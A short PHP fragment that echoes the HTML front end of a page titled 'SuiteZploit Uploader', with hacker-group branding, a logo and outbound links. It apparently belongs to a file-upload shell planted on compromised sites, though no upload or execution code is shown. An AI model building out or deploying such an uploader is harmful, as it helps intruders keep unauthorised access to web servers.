<?php
 {
echo '<link rel="shortcut icon" href="https://3.bp.blogspot.com/-btl4SgZKDdA/W_qtDGNiD8I/AAAAAAAAA28/o8LpuC7D6WIfmcw-mk6Wvjq-OPUv7gJNACLcBGAs/s1600/20181125_132029.png">';
echo '<center>';
echo '<br><br><br><img height="200" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/98/Transhumanism_h%2B_2.svg/1200px-Transhumanism_h%2B_2.svg.png"></a>
';


echo '<title>SuiteZploit Uploader</title>';
...
echo '</body></div><br><br><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.3.1/css/all.css"><center>
    ...
    <i class="fa fa-github"></i><br>  <br><a href="https://www.suitezploit.me"><font color="red">
